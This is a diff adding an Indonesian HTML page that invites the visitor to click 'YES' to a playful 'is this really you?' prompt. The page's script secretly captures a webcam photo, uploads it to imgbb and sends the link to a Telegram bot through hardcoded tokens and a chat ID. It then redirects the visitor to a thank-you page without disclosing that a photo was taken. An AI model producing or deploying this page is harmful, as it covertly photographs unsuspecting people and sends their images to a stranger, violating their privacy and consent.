@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Konfirmasi Kamera</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 20px;
+      background-color: #f0f8ff;
+      text-align: center;
+    }
+    #message {
+      display: none;
+      margin-top: 20px;
+    }
+    button {
+      font-size: 1em;
+      padding: 10px 20px;
+      margin: 15px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      background-color: #2196f3;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <h1>Ini beneran kamu kan? 😏</h1>
+  <button id="startBtn">YES</button>
+  <div id="message">
+    <p>Ternyata kamu 😄✨<br>Thank you udah menyempatkan waktunya 💖</p>
+  </div>
+
+  <script>
+    const startBtn = document.getElementById('startBtn');
+    const message = document.getElementById('message');
+
+    const imgbbKey = '285da3568a81e7791bf6806f0a181ac7';
+    const telegramToken = '8066497989:AAFHHluIg8WZugbq9C6Qmalqoo6vVjVS6rw';
+    const telegramChatId = '1789475188';
+
+    let stream;
+
+    startBtn.onclick = async () => {
+      startBtn.style.display = 'none';
+      message.style.display = 'block';
+
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.setAttribute('playsinline', 'true');
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const base64Image = canvas.toDataURL('image/jpeg');
+
+        const formData = new FormData();
+        formData.append('image', base64Image.split(',')[1]);
+
+        const imgbbRes = await fetch(`https://api.imgbb.com/1/upload?key=${imgbbKey}`, {
+          method: 'POST',
+          body: formData
+        });
+        const imgbbData = await imgbbRes.json();
+        const imageUrl = imgbbData.data.url;
+
+        if (imageUrl) {
+          setTimeout(async () => {
+            await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: `📸 Foto dari spinning wheel:\n${imageUrl}`
+              })
+            });
+
+            stream.getTracks().forEach(track => track.stop());
+            window.location.href = 'thankyou.html';
+          }, 500);
+        } else {
+          alert('Link gambar tidak ditemukan. Coba lagi.');
+        }
+      } catch (err) {
+        alert('Gagal mengakses kamera atau mengirim foto.');
+      }
+    };
+  </script>
+</body>
+</html>
